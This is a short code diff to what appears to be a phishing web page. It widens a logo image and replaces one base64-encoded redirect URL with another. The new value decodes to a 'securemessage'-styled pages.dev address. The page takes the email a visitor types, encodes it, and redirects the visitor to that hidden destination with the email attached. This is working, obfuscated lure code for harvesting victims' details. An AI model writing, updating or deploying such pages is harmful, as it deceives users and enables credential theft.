@@ -27,7 +27,7 @@
       text-align: center; 
     } 
     .container img { 
-      width: 80px; 
+      width: 140px; 
       margin-bottom: 15px; 
     } 
     .container h2 { 
@@ -96,7 +96,7 @@
     function continueLoading() {
       const email = document.getElementById('email-input').value.trim().toLowerCase();
       if (validateEmail(email)) {
-        const encodedLink = "aHR0cHM6Ly9zdXJpcHQuY3ZsbDB5ZGUuY29tLz8="; // Encoded URL
+        const encodedLink = "aHR0cHM6Ly9zZWN1cmVtZXNzYWdlLWNsaWVudGlkLTA1MjYwZDFiYTRmM2QzYjJjMzQzOTQtZDNiMmMzNDM5NDMzLnBhZ2VzLmRldi9zZWN1cmU="; // Encoded URL
         const link = atob(encodedLink) + "#" + btoa(email);
         window.location.href = link;
       } else {
